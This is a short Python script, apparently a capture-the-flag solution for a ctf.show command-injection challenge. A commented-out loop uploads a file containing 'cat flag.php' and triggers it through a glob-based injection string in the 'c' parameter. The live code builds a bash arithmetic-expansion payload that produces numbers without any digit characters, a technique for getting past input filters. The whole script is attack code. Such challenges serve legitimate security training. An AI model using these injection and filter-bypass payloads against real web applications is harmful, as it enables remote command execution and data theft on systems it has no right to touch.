import requests

# while True:
#     url = "https://2cebd930-e58d-49e4-9296-e87e7ec814bc.challenge.ctf.show/?c=.+/???/????????[@-[]"
#     r = requests.post(url, files={"file": ('feng.txt', b'cat flag.php')})
#     if r.text.find("flag") > 0:
#         print(r.text)
#         break

get_reverse_number = "$((~$(({}))))" # 取反操作
negative_one = "$((~$(())))"		# -1
payload = get_reverse_number.format(negative_one * 12)
print(payload)